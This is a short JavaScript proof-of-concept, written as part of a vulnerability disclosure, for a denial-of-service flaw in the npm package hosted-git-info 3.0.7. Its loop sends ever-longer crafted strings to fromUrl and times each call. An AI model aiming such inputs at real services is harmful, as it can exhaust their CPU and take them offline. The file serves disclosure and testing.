/**
 * hosted-git-info@3.0.7
 * Package Manager: npm
 * Link to published package: https://github.com/npm/hosted-git-info
 * Link to GitHub repo: https://github.com/npm/hosted-git-info
 * Severity level: High
 * Module Description: This will let you identify and transform various git hosts URLs between protocols.
 * Additional Info: It allows cause a denial of service when identifying crafted invalid URLs.
 * Contacted maintainer?: Yes
 * https://github.com/npm/hosted-git-info/pull/76
 * Open issue?: No
 */


var hostedGitInfo = require("hosted-git-info")
function build_attack(n) {
    var ret = "a:"
    for (var i = 0; i < n; i++) {
        ret += "a"
    }
    return ret + "!";
}

for(var i = 1; i <= 5000000; i++) {
   if (i % 1000 == 0) {
        var time = Date.now();
        var attack_str = build_attack(i)
       var parsedInfo = hostedGitInfo.fromUrl(attack_str)
        var time_cost = Date.now() - time;
        console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms")
 }
}